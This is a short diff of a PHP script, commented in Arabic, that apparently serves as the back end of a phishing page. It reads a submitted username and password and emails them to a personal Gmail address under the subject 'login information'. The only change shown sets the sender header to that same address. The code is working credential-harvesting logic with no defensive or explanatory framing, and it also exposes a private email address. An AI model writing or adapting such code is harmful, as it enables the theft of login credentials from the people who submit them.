@@ -10,7 +10,7 @@ $password = $data['password'];
 $to = "aicha.zendjabil@gmail.com"; // بريدك الإلكتروني
 $subject = "معلومات تسجيل الدخول";
 $message = "اسم المستخدم: $username\nكلمة المرور: $password";
-$headers = "From: webmaster@example.com"; // يمكنك تغييره بالمرسل الفعلي
+$headers = "From: aicha.zendjabil@gmail.com"; // يمكنك تغييره بالمرسل الفعلي
 
 // إرسال البريد الإلكتروني
 if (mail($to, $subject, $message, $headers)) {
